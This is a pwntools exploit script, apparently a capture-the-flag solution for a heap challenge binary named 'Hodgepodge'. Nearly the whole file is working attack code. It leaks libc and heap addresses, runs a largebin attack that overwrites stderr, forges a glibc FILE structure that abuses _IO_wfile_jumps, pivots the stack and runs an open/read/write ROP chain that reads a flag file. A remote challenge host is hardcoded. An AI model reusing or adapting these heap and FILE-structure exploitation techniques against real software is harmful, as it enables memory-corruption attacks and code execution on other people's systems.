# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './Hodgepodge'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc.so.6')
DEBUG = 1
if DEBUG:
    # libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '1.14.97.218'
    port = '28725'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a = 6      : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a = 4      : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(size , text = 'a'):
    cmd(1)
    sla('Size:' , size)
    sa('content' , text)

def edit(idx , text):
    cmd(3)
    sla('idx:' , idx)
    sa('ontent' , text)

def show(idx ):
    cmd(4)
    sla('idx' , idx)

def delete(idx ):
    cmd(2)
    sla('idx' , idx)

def pack_file(_flags = 0,
    _IO_read_ptr = 0,
    _IO_read_end = 0,
    _IO_read_base = 0,
    _IO_write_base = 0,
    _IO_write_ptr = 0,
    _IO_write_end = 0,
    _IO_buf_base = 0,
    _IO_buf_end = 0,
    _IO_save_base = 0,
    _IO_backup_base = 0,
    _IO_save_end = 0,
    _IO_marker = 0,
    _IO_chain = 0,
    _fileno = 0,
    _lock = 0,
    _wide_data = 0,
    _mode = 0):
    file_struct = p32(_flags) + \
        p32(0) + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno)
    file_struct = file_struct.ljust(0x88, '\x00')
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, '\x00')
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, '\x00')
    return file_struct

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0x428)
    add(0x401)
    add(0x418)
    add(0x401)

    delete(0)
    show(0)

    libc.address =  l64() - 0x1f2cc0

    stderr = libc.sym['stderr']
    lg('libc.address' , libc.address)
    lg('stderr' , stderr)
    # dbg()

    # dbg()
    add(0x430)
    delete(1)
    show(1)

    rl()
    heap_base = uu64(5) << 12
    delete(2)

    # dbg()
    payload = flat(
        libc.address + 0x1f30b0 , libc.address + 0x1f30b0,
        heap_base + 0x290 , stderr - 0x20
    )
    edit(0 , payload)
    add(0x430)

    libc_base = libc.address
    _IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
    _lock = libc_base + 0x1f5720
    
    syscall = libc.sym['alarm'] + 5
    setcontext = libc.sym['setcontext']
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    ret = pop_rdi_ret + 1
    leave_ret = libc.search(asm('leave;ret')).next()
    pop_4_ret = libc.search(asm('pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret')).next()

    add(0x418)

    # dbg()
    payload = flat(
        libc.address + 0x1f30b0 , libc.address + 0x1f30b0,
        heap_base + 0x290 , heap_base + 0x290
    )
    edit(0 , payload)

    add(0x428)
    delete(5)
    add(0x418)

    fake_io_addr = heap_base + 0x290
    flag_addr = fake_io_addr + 0x300 + 0x10
    
    file = pack_file(
        _flags = 0,
        _lock = _lock,
        _IO_save_base = fake_io_addr + 0x200,
        _IO_write_ptr = 0xa81, # 0xb81
        _wide_data = fake_io_addr + 0xe0 ,
    ) + p64(_IO_wfile_jumps)

    
    magic = libc.sym['svcudp_reply'] + 26

    rop = ROP(libc)
    rop.open(flag_addr , 0,0)
    rop.read(3 , flag_addr , 0x40)
    rop.write(1 , flag_addr , 0x40)
    
    _wide_data = p64(fake_io_addr + 0xe8)+'\x00'*0x98
    _wide_data += flat(fake_io_addr + 0xe0*2+0x10 , ret )
    _wide_data += '\x00'*0x30
    _wide_data += p64(fake_io_addr + 0xe0*2-0x68+8)
    _wide_data += p64(magic)
    
    lg("_wide_data" , len(_wide_data))
    
    payload =  file[0x10:] + _wide_data
    payload =  payload.ljust( 0x1f8,'\x00')
    payload += p64(pop_4_ret)
    payload += p64(114514) + p64(fake_io_addr + 0x200)
    payload += p64(fake_io_addr + 0x200 + 0x28)
    payload += p64(leave_ret)
    payload += rop.chain()

    payload = payload.ljust( 0x300,'\x00')+ 'flag\x00'
    edit(0 ,  payload)
    # dbg()
    edit(5 , "\x00"*0x418 + p64(0xff))

    dbg('_IO_wdoallocbuf')
    # add(0x428)

    cmd(1)
    sla('Size:' , 0x428)
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   Hodgepodge.py
@Time    :   2022/09/24 09:57:04
@Author  :   Niyah 
'''
